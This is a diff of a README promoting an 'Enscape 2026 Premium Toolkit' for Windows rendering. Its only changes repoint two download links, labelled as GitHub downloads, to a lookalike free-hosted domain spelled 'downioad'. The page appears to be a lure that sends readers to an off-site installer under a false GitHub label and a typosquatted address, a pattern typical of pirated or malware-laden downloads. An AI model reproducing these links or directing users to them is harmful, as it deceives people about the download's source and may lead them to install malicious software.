@@ -2,7 +2,7 @@
 
 The Enscape 2026 Premium Toolkit is designed to elevate your rendering experience on Windows desktops. This comprehensive suite provides tools and enhancements for seamless integration with Enscape, ensuring high-quality outputs for architects and designers. With a focus on usability and performance, it offers a streamlined workflow for real-time visualization and immersive virtual reality experiences.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -52,7 +52,7 @@ A4: Yes, the toolkit bundles plugins for SketchUp and Revit, allowing direct int
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
